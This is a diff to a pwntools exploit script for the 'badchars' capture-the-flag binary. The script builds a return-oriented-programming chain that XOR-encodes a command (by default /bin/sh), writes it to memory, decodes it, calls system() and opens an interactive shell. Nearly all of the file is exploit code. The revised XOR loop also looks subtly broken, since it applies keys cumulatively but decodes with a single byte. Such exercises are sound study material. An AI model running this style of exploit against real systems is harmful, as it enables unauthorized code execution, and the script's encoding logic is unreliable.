@@ -1,4 +1,5 @@
 import pwn
+import sys
 
 BAD_CHARS = "bic/ fns"
 
@@ -6,50 +7,45 @@ BAD_CHARS = "bic/ fns"
 process = pwn.process("./badchars")
 pwn.context(os="linux", arch="amd64")
 elf = pwn.ELF("badchars")
-data_section = elf.bss()
-system_arg = "cat flag.txt"
+rop = pwn.ROP(elf)
 
-def encode_arg(system_arg):
-    _xor = 1 
-    encoded_system_arg = system_arg
-    while any(bad in encoded_system_arg for bad in BAD_CHARS):
-        _xor += 1
-        encoded_system_arg = ''.join(chr(ord(s) ^ _xor) for s in system_arg)
-    return _xor, encoded_system_arg
+# Get cmd, encode and pad
+cmd = "/bin/sh" if len(sys.argv) == 1 else sys.argv[1]
+_xor = 0
 
-def pad_input(inp):
-    return inp + 8 * "\x00" if len(inp) % 8 == 0 else  inp + (8-(len(inp)%8)) * "\x00"
+while any(char in cmd for char in BAD_CHARS):
+    _xor += 1
+    cmd = ''.join(chr(ord(s) ^ _xor) for s in cmd)
+    if _xor == 256:
+        pwn.log.info("No possible command found\n Exiting smoothly")
+        sys.exit(0)
 
-def write_to_location(inp, loc):
-    inp = pad_input(inp)
-    return  "".join([pwn.p64(elf.symbols["usefulGadgets"]+11) +   # pop r12; pop r13; ret;
-                     inp[i:i+8] +
-                     pwn.p64(loc+i) +
-                     pwn.p64(elf.symbols["usefulGadgets"]+4)      # mov r13 r12; ret;
-                     for i in range(0, len(inp), 8)])
+pwn.log.success("Encoding found with,\n xor int = {0} and cmd = {1}".format(_xor + 1, cmd))
+padded_cmd = cmd + 8 * "\x00" if len(cmd) % 8 == 0 else cmd + (8-(len(cmd)%8)) * "\x00"
 
-def decode_data(inp, loc, xor_byte):
-    return "".join([pwn.p64(elf.symbols["usefulGadgets"]+16) +    # pop r14; pop r15; ret;
-                    chr(xor_byte) * 8 +
-                    pwn.p64(loc+i) +
-                    pwn.p64(elf.symbols["usefulGadgets"])         # xor r15 r14; ret;
-                    for i in range(len(inp))]) 
+# Write to location
+for i in range(0, len(padded_cmd), 8):
+    rop.raw(rop.find_gadget(["pop r12", "pop r13", "ret"]))
+    rop.raw(padded_cmd[i:i+8])
+    rop.raw(elf.bss()+i)
+    rop.raw(elf.symbols["usefulGadgets"]+4) # mov r13, r12
 
-# Find correct encoding till no more bad chars
-xor_byte, encoded_system_arg = encode_arg(system_arg)
+# Decode if command was _xor'd
+if _xor !=  0:
+    for i in range(len(cmd)):
+        rop.raw(elf.symbols["usefulGadgets"]+16)
+        rop.raw(chr(_xor+1) * 8)
+        rop.raw(elf.bss()+i)
+        rop.raw(elf.symbols["usefulGadgets"]) # xor r15, r14; ret;
 
-# Write payload
-payload = "A" * 40
-payload += write_to_location(encoded_system_arg, data_section)
-payload += decode_data(encoded_system_arg, data_section, xor_byte)
-payload += pwn.p64(elf.symbols["usefulGadgets"]+9)                # pop rdi; ret;
-payload += pwn.p64(data_section)
-payload += pwn.p64(elf.symbols["system"])
-print payload
+rop.system(elf.bss())
+pwn.log.info(rop.dump())
 
+# Execute cmd
+payload = "A" * 40 + rop.chain()
 process.readline()
 process.readline()
 process.readline()
 process.readline()
 process.sendline(payload)
-print process.readline()[2:]
+process.interactive()
